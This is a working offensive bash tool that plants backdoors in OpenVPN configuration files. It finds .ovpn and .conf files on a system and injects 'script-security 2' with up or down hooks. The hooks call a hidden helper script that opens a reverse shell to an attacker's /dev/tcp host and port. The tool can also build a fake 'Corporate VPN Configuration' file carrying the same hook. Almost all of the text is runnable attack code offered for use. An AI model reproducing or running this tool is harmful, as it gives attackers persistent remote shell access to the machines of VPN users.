#!/bin/bash
# OpenVPN Config Backdoor (T1546)
# Injects up/down/tls-verify directives into .ovpn configs to execute on VPN connect

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_ovpn"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║       OpenVPN Config Backdoor (T1546)                ║"
    echo " ║  Fires on: VPN connect, disconnect, TLS handshake    ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

find_ovpn_files() {
    find /etc/openvpn /home /root /tmp -name "*.ovpn" -o -name "*.conf" 2>/dev/null | \
        xargs grep -l "remote\|proto\|client" 2>/dev/null | head -20
}

inject_config() {
    local CONF="$1" PAYLOAD="$2" HOOK="${3:-up}"
    [ -f "$CONF" ] || { echo -e "${RED}[-] File not found: ${CONF}${NC}"; return; }

    grep -q "$MARKER" "$CONF" && { echo -e "${YELLOW}[!] Already injected: ${CONF}${NC}"; return; }

    cp "$CONF" "${CONF}.d3m0n.bak"

    # Write payload script
    local SCRIPT="/etc/openvpn/.${MARKER}_helper"
    mkdir -p "$(dirname "$SCRIPT")"
    printf '#!/bin/sh\n# %s\n%s >/dev/null 2>&1 &\nexit 0\n' "$MARKER" "$PAYLOAD" > "$SCRIPT"
    chmod 755 "$SCRIPT"

    # Inject directives
    {
        cat "$CONF"
        printf '\n# %s\nscript-security 2\n%s %s\n' "$MARKER" "$HOOK" "$SCRIPT"
    } > "${CONF}.tmp"
    mv "${CONF}.tmp" "$CONF"

    echo -e "${GREEN}[+] Injected into: ${CONF}${NC}"
    echo -e "${GREEN}[+] Hook: ${HOOK} → ${SCRIPT}${NC}"
    echo -e "${YELLOW}[!] Fires when VPN connection is ${HOOK}${NC}"
}

inject_revshell() {
    local CONF="$1" LHOST="$2" LPORT="$3" HOOK="${4:-up}"
    local PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"
    inject_config "$CONF" "$PAYLOAD" "$HOOK"
}

inject_all_system() {
    local LHOST="$1" LPORT="$2"
    echo -e "${YELLOW}[*] Searching for OpenVPN configs...${NC}"
    local FOUND=0
    find_ovpn_files | while read -r f; do
        echo -e "  [+] Injecting: $f"
        inject_revshell "$f" "$LHOST" "$LPORT" "up"
        FOUND=$((FOUND + 1))
    done
    echo -e "${GREEN}[+] Injection complete${NC}"
}

create_malicious_config() {
    # Create a new malicious .ovpn that mimics a legitimate config
    local OUTFILE="$1" LHOST="$2" LPORT="$3" REMOTE="${4:-1.2.3.4}" RPORT="${5:-1194}"
    local SCRIPT="/etc/openvpn/.${MARKER}_helper"
    local PAYLOAD="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1"

    printf '#!/bin/sh\n# %s\n%s\nexit 0\n' "$MARKER" "$PAYLOAD" > "$SCRIPT"
    chmod 755 "$SCRIPT"

    cat > "$OUTFILE" << EOF
# Corporate VPN Configuration
# ${MARKER}
client
dev tun
proto udp
remote ${REMOTE} ${RPORT}
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
cert client.crt
key client.key
tls-auth ta.key 1
cipher AES-256-CBC
verb 3
script-security 2
up ${SCRIPT}
down ${SCRIPT}
EOF
    echo -e "${GREEN}[+] Malicious .ovpn created: ${OUTFILE}${NC}"
    echo -e "${YELLOW}[!] Fires on connect (up) and disconnect (down)${NC}"
}

list_installed() {
    echo -e "${YELLOW}[*] Injected configs:${NC}"
    find /etc/openvpn /home /root -name "*.ovpn" -o -name "*.conf" 2>/dev/null | \
        xargs grep -l "$MARKER" 2>/dev/null | while read -r f; do echo "  $f"; done
    echo -e "${YELLOW}[*] Helper scripts:${NC}"
    find /etc/openvpn -name "*.${MARKER}*" -o -name ".${MARKER}*" 2>/dev/null | while read -r f; do echo "  $f"; done
}

cleanup() {
    echo -e "${YELLOW}[*] Cleaning...${NC}"
    # Restore backups
    find /etc/openvpn /home /root -name "*.d3m0n.bak" 2>/dev/null | while read -r f; do
        mv "$f" "${f%.d3m0n.bak}"
        echo -e "${GREEN}[+] Restored: ${f%.d3m0n.bak}${NC}"
    done
    # Remove helper scripts
    find /etc/openvpn -name ".${MARKER}*" -delete 2>/dev/null
    echo -e "${GREEN}[+] Cleaned${NC}"
}

banner
[[ $EUID -ne 0 ]] && { echo -e "${RED}[-] Root required.${NC}"; exit 1; }
command -v openvpn >/dev/null 2>&1 || echo -e "${YELLOW}[!] openvpn not found — can still inject configs${NC}"

echo -e "  ${YELLOW}[1]${NC} Inject revshell into specific .ovpn (up hook)"
echo -e "  ${YELLOW}[2]${NC} Inject revshell into specific .ovpn (down hook)"
echo -e "  ${YELLOW}[3]${NC} Inject custom command into specific .ovpn"
echo -e "  ${YELLOW}[4]${NC} Inject into ALL system .ovpn files"
echo -e "  ${YELLOW}[5]${NC} Create malicious .ovpn file"
echo -e "  ${YELLOW}[6]${NC} List installed"
echo -e "  ${YELLOW}[7]${NC} Cleanup"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1)
        echo -e "${YELLOW}Found configs:${NC}"; find_ovpn_files | head -10
        read -rp "Config path: " CONF
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        inject_revshell "$CONF" "$LHOST" "$LPORT" "up"
        ;;
    2)
        echo -e "${YELLOW}Found configs:${NC}"; find_ovpn_files | head -10
        read -rp "Config path: " CONF
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        inject_revshell "$CONF" "$LHOST" "$LPORT" "down"
        ;;
    3)
        read -rp "Config path: " CONF
        read -rp "Command: " CMD
        read -rp "Hook [up/down/route-up]: " HOOK; HOOK="${HOOK:-up}"
        inject_config "$CONF" "$CMD" "$HOOK"
        ;;
    4)
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        inject_all_system "$LHOST" "$LPORT"
        ;;
    5)
        read -rp "Output file [/tmp/corporate.ovpn]: " OUT; OUT="${OUT:-/tmp/corporate.ovpn}"
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        read -rp "VPN server IP [1.2.3.4]: " REMOTE; REMOTE="${REMOTE:-1.2.3.4}"
        create_malicious_config "$OUT" "$LHOST" "$LPORT" "$REMOTE"
        ;;
    6) list_installed ;;
    7) cleanup ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
